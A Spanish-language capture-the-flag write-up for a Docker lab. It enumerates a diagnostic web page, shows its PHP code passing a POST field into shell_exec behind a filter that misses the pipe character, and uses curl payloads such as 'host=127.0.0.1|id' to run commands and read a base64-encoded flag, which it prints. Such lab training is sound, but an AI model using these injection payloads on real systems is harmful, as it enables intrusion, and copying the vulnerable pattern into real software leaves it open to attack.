# Diagnóstico de enlace

> Visor de diagnóstico de enlace de la subestación Norte. Descarga el zip del lab y ejecútalo en Kali/Linux con Docker.
>
> `chmod +x startlab.sh && ./startlab.sh blackout-web04.tar` → IP del lab (172.18.0.2). Enumera con nmap y ataca por HTTP.
>
> **Consejo:** enumera la IP del lab con nmap. Hay un visor de diagnóstico de nodo.

**Flag:** `WHOAMI{cmd1_enlac3_n0rt3}`

---

## Resolución

### 1. Levantar y enumerar

**Herramienta:** `docker inspect` + `nmap`. **Por qué:** el script de arranque no me deja la IP fija, así que la consulto a Docker; luego `nmap` me dice qué servicios hay a los que atacar por HTTP.

**Parámetros de nmap:** `-sV` (detección de versión del servicio) y `-p-` (escanea los 65535 puertos, no solo los comunes).

```bash
$ unzip blackout-web04.zip && chmod +x startlab.sh && ./startlab.sh blackout-web04.tar
$ sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' blackout-web04
172.17.0.2

$ nmap -sV -p- 172.17.0.2
80/tcp open  http    Apache httpd 2.4.68 (Debian)
```

Solo el puerto 80. Como solo hay HTTP, el ataque será por esa vía.

### 2. Encontrar el visor de diagnóstico

Al fuzzear/explorar la app aparece `/diagnostico.php`, que ofrece un "chequeo de nodo": un campo `host` que se envía por POST. Revisando el código del endpoint:

```php
$host = (string) ($_POST['host'] ?? '');
if ($host === '' || preg_match('/[;&`\n\r]/', $host)) {
    $error = '...';
} else {
    $salida = shell_exec('getent ahosts ' . $host . ' 2>&1');
}
```

Ejecuta `getent ahosts <host>` en el shell. El filtro bloquea `;`, `&`, backticks y saltos de línea… **pero no bloquea `|`** → **command injection por pipe**.

### 3. Inyectar con `|`

**Herramienta:** `curl`. **Por qué:** sirve para enviar peticiones HTTP arbitrarias; aquí, el POST con el payload malicioso en el campo `host`.

**Parámetros:** `-X POST` fija el método y `-d` envía el cuerpo del formulario.

```bash
$ curl -X POST http://172.17.0.2/diagnostico.php -d "host=127.0.0.1|id"
uid=33(www-data) gid=33(www-data)
```

El pipe ejecuta un comando adicional. **Lo que vi:** el `|` ejecutó `id` y devolvió el usuario `www-data`, confirmando la inyección. A partir de ahí se explora el sistema buscando la flag:

```bash
$ curl -X POST http://172.17.0.2/diagnostico.php \
    --data-urlencode "host=127.0.0.1|find / -name '*.dat' 2>/dev/null | grep -v proc"
/var/lib/latam/enlace.dat
```

**Decisión:** como el reto es de "enlace"/telemetría, busqué archivos `.dat` (típicos de datos) y apareció `enlace.dat`.

### 4. Leer el archivo con la flag

```bash
$ curl -X POST http://172.17.0.2/diagnostico.php \
    --data-urlencode "host=127.0.0.1|cat /var/lib/latam/enlace.dat"
REGISTRO=V0hPQU1Je2NtZDFfZW5sYWMzX24wcnQzfQ==
```

El valor termina en `==`, firma de **base64**:

```bash
$ echo "V0hPQU1Je2NtZDFfZW5sYWMzX24wcnQzfQ==" | base64 -d
WHOAMI{cmd1_enlac3_n0rt3}
```

## Lección

Un campo que se mete en un `shell_exec` es oro. Si el filtro bloquea `;` y `&`, prueba `|` (pipe): ejecuta un comando adicional sin necesitar terminador. Luego, explora `/var/lib` o directorios de la app: ahí suelen esconder archivos `.dat` con la flag en base64.